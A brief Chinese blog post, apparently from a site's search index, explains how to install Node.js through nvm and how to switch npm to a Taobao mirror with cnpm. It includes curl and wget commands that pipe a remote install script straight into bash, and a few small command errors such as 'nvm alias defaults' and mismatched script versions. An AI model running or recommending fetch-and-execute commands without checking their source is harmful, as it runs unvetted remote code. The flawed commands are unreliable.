    <content type="text"><![CDATA[安装 Node.js 的最佳方式是使用 nvm。nvm 最开始是在 Mac OS 下开发的,所以 Mac OS 下同样使用 nvm 安装 Node.js下载 nvm通过 curl 下载（需要安装 curl）apt-get install curl curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.11/install.sh | bash 通过 wget 下载（liunx 下载命令）wget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.33.2/install.sh | bash 重启终端,安装 Node.jsnvm install &lt;version&gt; 设定 Node.js 的默认版本nvm alias defaults &lt;version&gt; 查看 Node.js 和 npm 版本号node -v npm -v npm 淘宝换源npm 加载的模块,多数是国外源的,所以很容易被墙,解决办法,除了翻墙,还有就是 npm 换源,使用国内源,但是本人还是推介使用国外源,因为国外源较国内源稳定、全面。npm install -g cnpm --registry=//registry.npm.taobao.org cnpm 安装模块cnpm install [name]]]></content>
      <categories>
        <category>node.js</category>
      </categories>
      <tags>
        <tag>Liunx</tag>
        <tag>Node.js</tag>
      </tags>
  </entry>
</search>
